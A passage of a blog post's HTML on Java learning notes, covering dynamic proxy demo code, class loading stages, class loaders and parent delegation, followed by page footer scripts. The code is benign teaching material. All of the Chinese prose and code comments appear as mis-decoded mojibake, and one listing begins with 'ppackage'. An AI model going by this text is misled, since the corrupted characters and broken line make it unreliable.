class="hljs-string">&quot;æ”¶ä¸­ä»‹è´¹&quot;</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo03;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//çœŸå®è§’è‰²</span><br>        <span class="hljs-type">Host</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Host</span>();<br>        <span class="hljs-comment">//ä»£ç†è§’è‰²ï¼Œç°åœ¨æ²¡æœ‰</span><br>        <span class="hljs-type">ProxyInvocationHangler</span> <span class="hljs-variable">pih</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProxyInvocationHangler</span>();<br>        <span class="hljs-comment">//é€šè¿‡è°ƒç”¨ç¨‹åºå¤„ç†è§’è‰²æ¥å¤„ç†æˆ‘ä»¬è¦è°ƒç”¨çš„æ¥å£å¯¹è±¡</span><br>        pih.setRent(host);<br>        <span class="hljs-type">Rent</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (Rent) pih.getProxy();<br>        proxy.rent();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<p>æ¡ˆä¾‹äºŒï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo04;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-comment">//ä½¿ç”¨æ­¤ç±»è‡ªåŠ¨ç”Ÿæˆä»£ç†ç±»</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProxyInvocationHangler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> &#123;<br><br>    <span class="hljs-comment">//è¢«ä»£ç†çš„æ¥å£</span><br>    <span class="hljs-keyword">private</span> Object target;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setTarget</span><span class="hljs-params">(Object target)</span> &#123;<br>        <span class="hljs-built_in">this</span>.target = target;<br>    &#125;<br><br>    <span class="hljs-comment">//ç”Ÿæˆå¾—åˆ°ä»£ç†ç±»</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getProxy</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> Proxy.newProxyInstance(<span class="hljs-built_in">this</span>.getClass().getClassLoader(),<br>                                      target.getClass().getInterfaces(), <span class="hljs-built_in">this</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//å¤„ç†ä»£ç†å®ä¾‹ï¼Œå¹¶è¿”å›ç»“æœ</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        log(method.getName());<br>        <span class="hljs-comment">//åŠ¨æ€ä»£ç†çš„æœ¬è´¨ï¼Œå°±æ˜¯ä½¿ç”¨åå°„æœºåˆ¶å®ç°</span><br>        <span class="hljs-keyword">return</span> method.invoke(target, args);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">log</span><span class="hljs-params">(String msg)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;æ‰§è¡Œäº†&quot;</span>+msg+<span class="hljs-string">&quot;æ–¹æ³•&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo04;<br><br><span class="hljs-keyword">import</span> com.kuang.demo02.UserService;<br><span class="hljs-keyword">import</span> com.kuang.demo02.UserServiceImpl;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//çœŸå®è§’è‰²</span><br>        <span class="hljs-type">UserServiceImpl</span> <span class="hljs-variable">userService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceImpl</span>();<br>        <span class="hljs-comment">//ä»£ç†è§’è‰²ï¼Œç°åœ¨æ²¡æœ‰p</span><br>        <span class="hljs-type">ProxyInvocationHangler</span> <span class="hljs-variable">pih</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProxyInvocationHangler</span>();<br>        <span class="hljs-comment">//è®¾ç½®ä»£ç†å¯¹è±¡</span><br>        pih.setTarget(userService);<br>        <span class="hljs-comment">//åŠ¨æ€ç”Ÿæˆä»£ç†ç±»</span><br>        <span class="hljs-type">UserService</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (UserService) pih.getProxy();<br>        proxy.add();<br>        <span class="hljs-comment">//        proxy.delete();</span><br>        <span class="hljs-comment">//        proxy.update();</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<h1 id="4ã€ç±»çš„åŠ¨æ€åŠ è½½"><a href="#4ã€ç±»çš„åŠ¨æ€åŠ è½½" class="headerlink" title="4ã€ç±»çš„åŠ¨æ€åŠ è½½"></a>4ã€ç±»çš„åŠ¨æ€åŠ è½½</h1><blockquote>
<p><font style="color:rgb(33, 37, 41);">Javaç±»åŠ è½½æœºåˆ¶å’Œå¯¹è±¡åˆ›å»ºè¿‡ç¨‹</font></p>
<p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000023876273">https://segmentfault.com/a/1190000023876273</a></p>
<p><font style="color:rgb(60, 60, 67);">ç±»åŠ è½½è¿‡ç¨‹è¯¦è§£</font></p>
<p><a target="_blank" rel="noopener" href="https://javaguide.cn/java/jvm/class-loading-process.html">https://javaguide.cn/java/jvm/class-loading-process.html</a></p>
</blockquote>
<h3 id="ç±»åŠ è½½è¿‡ç¨‹ï¼š"><a href="#ç±»åŠ è½½è¿‡ç¨‹ï¼š" class="headerlink" title="ç±»åŠ è½½è¿‡ç¨‹ï¼š"></a>ç±»åŠ è½½è¿‡ç¨‹ï¼š</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757858.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757062.png" srcset="/img/loading.gif" lazyload></p>
<ul>
<li>**åŠ è½½ï¼š**å°†ç±»çš„ class æ–‡ä»¶å­—èŠ‚ç åŠ è½½åˆ°å†…å­˜ï¼Œå¹¶å°†é™æ€æ•°æ®è½¬åŒ–ä¸ºæ–¹æ³•åŒºçš„è¿è¡Œæ—¶æ•°æ®ç»“æ„ï¼Œç„¶åç”Ÿæˆä¸€ä¸ª java.lang.Class å¯¹è±¡</li>
<li>**é“¾æ¥ï¼š**å°†javaç±»äºŒè¿›åˆ¶æ•°æ®åˆå¹¶åˆ° JREä¸­<ul>
<li>**éªŒè¯ï¼š**ç¡®ä¿åŠ è½½çš„ç±»ä¿¡æ¯ç¬¦åˆJVMè§„èŒƒï¼Œæ²¡æœ‰å®‰å…¨æ–¹é¢çš„é—®é¢˜</li>
<li>**å‡†å¤‡ï¼š**æ­£å¼ä¸ºç±»å˜é‡ ï¼ˆstaticï¼‰ åˆ†é…å†…å­˜å¹¶è®¾ç½®ç±»å˜é‡é»˜è®¤åˆå§‹å€¼çš„é˜¶æ®µï¼ˆæ‰€ä»¥è¯´staticåœ¨åˆå§‹åŒ–ä¹‹å‰å°±å·²ç»æœ‰äº†ä¸€ä¸ªå€¼ï¼‰ï¼Œè¿™äº›å†…å­˜éƒ½å°†åœ¨æ–¹æ³•åŒºä¸­è¿›è¡Œåˆ†é…</li>
<li>**è§£æï¼š**è™šæ‹Ÿæœºå°†å¸¸é‡æ± å†…çš„ç¬¦å·å¼•ç”¨æ›¿æ¢ä¸ºç›´æ¥å¼•ç”¨çš„è¿‡ç¨‹</li>
</ul>
</li>
<li>**åˆå§‹åŒ–ï¼š**æ‰§è¡Œåˆå§‹åŒ–æ–¹æ³• <code>&lt;clinit&gt; ()</code>æ–¹æ³•çš„è¿‡ç¨‹ï¼Œæ˜¯ç±»åŠ è½½çš„æœ€åä¸€æ­¥ï¼Œè¿™ä¸€æ­¥ JVM æ‰å¼€å§‹çœŸæ­£æ‰§è¡Œç±»ä¸­å®šä¹‰çš„ Java ç¨‹åºä»£ç (å­—èŠ‚ç )ã€‚<code>&lt;clinit&gt; ()</code>æ–¹æ³•ä¼šå°†è¯¥ç±»çš„é™æ€å˜é‡åˆå¹¶ã€‚</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.reflection;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test05</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">A</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">A</span>();<br>        System.out.println(A.m);<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        1ã€åŠ è½½åˆ°å†…å­˜ï¼Œä¼šåœ¨å †äº§ç”Ÿä¸€ä¸ªç±»å¯¹åº”çš„ Class å¯¹è±¡</span><br><span class="hljs-comment">        2ã€é“¾æ¥ï¼Œé“¾æ¥ç»“æŸå m=0</span><br><span class="hljs-comment">        3ã€åˆå§‹åŒ–</span><br><span class="hljs-comment">            &lt;clinit&gt;()&#123;</span><br><span class="hljs-comment">                System.out.println(&quot;Aç±»é™æ€ä»£ç å—åˆå§‹åŒ–&quot;);</span><br><span class="hljs-comment">                m = 300;</span><br><span class="hljs-comment">                m = 100;</span><br><span class="hljs-comment">            &#125;</span><br><span class="hljs-comment">            m = 100</span><br><span class="hljs-comment">         */</span><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>&#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Aç±»é™æ€ä»£ç å—åˆå§‹åŒ–&quot;</span>);<br>        m = <span class="hljs-number">300</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">A</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Aç±»çš„æ— å‚æ„é€ åˆå§‹åŒ–&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="ç±»åŠ è½½å™¨ï¼š"><a href="#ç±»åŠ è½½å™¨ï¼š" class="headerlink" title="ç±»åŠ è½½å™¨ï¼š"></a>ç±»åŠ è½½å™¨ï¼š</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311758397.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java">ppackage com.kuang.reflection;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test07</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br><br>        <span class="hljs-comment">//è·å–ç³»ç»Ÿç±»çš„åŠ è½½å™¨</span><br>        ClassLoader systemClassLoader=ClassLoader.getSystemClassLoader();<br>        System.out.println(systemClassLoader);<br><br>        <span class="hljs-comment">//è·å–ç³»ç»Ÿç±»çš„åŠ è½½å™¨çš„çˆ¶ç±»åŠ è½½å™¨-&gt;æ‰©å±•ç±»åŠ è½½å™¨</span><br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">parent</span> <span class="hljs-operator">=</span> systemClassLoader.getParent();<br>        System.out.println(parent);<br><br>        <span class="hljs-comment">//è·å–æ‰©å±•ç±»åŠ è½½å™¨çš„çˆ¶ç±»åŠ è½½å™¨--&gt;æ ¹åŠ è½½å™¨ï¼ˆc/c++ï¼‰</span><br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">parent1</span> <span class="hljs-operator">=</span> parent.getParent();<br>        System.out.println(parent1);<br><br>        <span class="hljs-comment">//æµ‹è¯•å½“å‰ç±»æ˜¯å“ªä¸ªç±»åŠ è½½å™¨åŠ è½½çš„</span><br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.kuang.reflection.Test07&quot;</span>).getClassLoader();<br>        System.out.println(classLoader);<br><br>        <span class="hljs-comment">//æµ‹è¯• jdk å†…éƒ¨çš„ç±»æ˜¯è°åŠ è½½çš„</span><br>        classLoader=Class.forName(<span class="hljs-string">&quot;java.lang.Object&quot;</span>).getClassLoader();<br>        System.out.println(classLoader);<br><br>        <span class="hljs-comment">//è·å¾—ç³»ç»Ÿç±»åŠ è½½å™¨å¯ä»¥åŠ è½½çš„è·¯å¾„</span><br>        System.out.println(System.getProperty(<span class="hljs-string">&quot;java.class.path&quot;</span>));<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\charsets.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\deploy.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\access-bridge-64.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\cldrdata.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\dnsns.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\jaccess.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\jfxrt.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\localedata.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\nashorn.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\sunec.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\sunjce_provider.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\sunmscapi.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\sunpkcs11.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\zipfs.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\javaws.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\jce.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\jfr.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\jfxswt.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\jsse.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\management-agent.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\plugin.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\resources.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\rt.jar;</span><br><span class="hljs-comment">        D:\JavaCode\study_code\annotation&amp;reflection\annotation\target\classes;</span><br><span class="hljs-comment">        C:\Users\SZZY\AppData\Local\Programs\IntelliJ IDEA Ultimate\lib\idea_rt.jar</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">         */</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311758656.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="åŒäº²å§”æ´¾æœºåˆ¶"><a href="#åŒäº²å§”æ´¾æœºåˆ¶" class="headerlink" title="åŒäº²å§”æ´¾æœºåˆ¶"></a>åŒäº²å§”æ´¾æœºåˆ¶</h3><p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://javaguide.cn/java/jvm/classloader.html#%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%A8%A1%E5%9E%8B">https://javaguide.cn/java/jvm/classloader.html#%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%A8%A1%E5%9E%8B</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luckforefforts/p/13642685.html">https://www.cnblogs.com/luckforefforts/p/13642685.html</a></p>
<p><font style="color:rgb(89, 97, 114);">å¦‚æœä¸€ä¸ªç±»åŠ è½½å™¨æ”¶åˆ°äº†ç±»åŠ è½½çš„è¯·æ±‚ï¼Œå®ƒé¦–å…ˆä¸ä¼šè‡ªå·±å»å°è¯•åŠ è½½è¿™ä¸ªç±»ï¼Œè€Œæ˜¯æŠŠè¿™ä¸ªè¯·æ±‚å§”æ´¾ç»™çˆ¶ç±»åŠ è½½å™¨å»å®Œæˆï¼Œæ¯ä¸€ä¸ªå±‚æ¬¡çš„åŠ è½½å™¨éƒ½æ˜¯å¦‚æ­¤ï¼Œå› æ­¤æ‰€æœ‰çš„ç±»åŠ è½½è¯·æ±‚éƒ½ä¼šä¼ ç»™é¡¶å±‚çš„å¯åŠ¨ç±»åŠ è½½å™¨ï¼Œåªæœ‰å½“çˆ¶åŠ è½½å™¨åé¦ˆè‡ªå·±æ— æ³•å®Œæˆè¯¥åŠ è½½è¯·æ±‚ï¼ˆè¯¥åŠ è½½å™¨çš„æœç´¢èŒƒå›´ä¸­æ²¡æœ‰æ‰¾åˆ°å¯¹åº”çš„ç±»ï¼‰æ—¶ï¼Œå­åŠ è½½å™¨æ‰ä¼šå°è¯•è‡ªå·±å»åŠ è½½ã€‚</font></p>
<h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><p><font style="color:rgb(34, 34, 38);">javaåºåˆ—åŒ–ä¸ååºåˆ—åŒ–å…¨è®²è§£</font></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mocas_wang/article/details/107621010">https://blog.csdn.net/mocas_wang&#x2F;article&#x2F;details&#x2F;107621010</a></p>
<p><font style="color:rgb(37, 41, 51);">ä¸ºä»€ä¹ˆHashMapè¦è‡ªå·±å®ç°writeObjectå’ŒreadObjectæ–¹æ³•ï¼Ÿ</font></p>
<p><a target="_blank" rel="noopener" href="https://juejin.cn/post/6844903954774491144">https://juejin.cn/post/6844903954774491144</a></p>
<p><font style="color:rgb(37, 41, 51);">è°ˆè°ˆJavaåå°„ï¼šä»å…¥é—¨åˆ°å®è·µï¼Œå†åˆ°åŸç†</font></p>
<p><a target="_blank" rel="noopener" href="https://juejin.cn/post/6844904025607897096">https://juejin.cn/post/6844904025607897096</a></p>
<p><font style="color:rgb(25, 27, 31);">è®¾è®¡æ¨¡å¼ï¼ˆå››ï¼‰â€”â€”ææ‡‚ä»€ä¹ˆæ˜¯ä»£ç†æ¨¡å¼</font></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/72644638">https://zhuanlan.zhihu.com/p/72644638</a></p>
<p><font style="color:rgb(33, 37, 41);">Javaç±»åŠ è½½æœºåˆ¶å’Œå¯¹è±¡åˆ›å»ºè¿‡ç¨‹</font></p>
<p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000023876273">https://segmentfault.com/a/1190000023876273</a></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/Java/" class="category-chain-item">Java</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/java-%E5%AD%A6%E4%B9%A0/" class="print-no-link">#java å­¦ä¹ </a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>Java ååºåˆ—åŒ–å­¦ä¹ </div>
      <div>http://xvshifu.github.io/2025/08/26/Javaåºåˆ—åŒ–ä¸ååºåˆ—åŒ–/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>ä½œè€…</div>
          <div>Xvsf</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>å‘å¸ƒäº</div>
          <div>2025å¹´8æœˆ26æ—¥</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>è®¸å¯åè®®</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - ç½²å">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2025/08/30/CC1/" title="CC1">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">CC1</span>
                        <span class="visible-mobile">ä¸Šä¸€ç¯‡</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/08/20/JshERP-2.3%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="åå¤ERP 2.3 ä»£ç å®¡è®¡">
                        <span class="hidden-mobile">åå¤ERP 2.3 ä»£ç å®¡è®¡</span>
                        <span class="visible-mobile">ä¸‹ä¸€ç¯‡</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"0wmNTqqCOUst92FKToSXxgvQ-gzGzoHsz","appKey":"p527aBaA4G01EJdMOVMGXsHR","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":true,"recordIP":true,"serverURLs":"https://0wmntqqc.lc-cn-n1-shared.com","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>ç›®å½•</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  




  









    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">æœç´¢</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">å…³é”®è¯</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner" style="text-align:center; color:#555; margin-top:20px;">

  <!-- è®¡æ—¶å™¨ -->
  <div style="margin-bottom:10px; font-size:14px; color:#ff6f61;">
    ğŸš€ å·²è¿è¡Œï¼š
    <span id="timeDate">è½½å…¥å¤©æ•°...</span>
    <span id="times">è½½å…¥æ—¶åˆ†ç§’...</span>
    <script>
      function createtime() {
          var now = new Date();
          var grt = new Date("08/07/2025 00:00:00");
          var diff = now - grt;

          var days = Math.floor(diff / 1000 / 60 / 60 / 24);
          var hours = Math.floor((diff / 1000 / 60 / 60) % 24);
          var minutes = Math.floor((diff / 1000 / 60) % 60);
          var seconds = Math.floor((diff / 1000) % 60);

          if(hours<10) hours="0"+hours;
          if(minutes<10) minutes="0"+minutes;
          if(seconds<10) seconds="0"+seconds;

          document.getElementById("timeDate").innerHTML = days + " å¤©";
          document.getElementById("times").innerHTML = hours + " æ—¶ " + minutes + " åˆ† " + seconds + " ç§’";
      }
      setInterval(createtime, 1000);
      createtime();
    </script>
  </div>

  <!-- è‡ªå®šä¹‰å†…å®¹ -->
  
    <div style="margin-bottom:10px; font-size:13px; color:#666;">
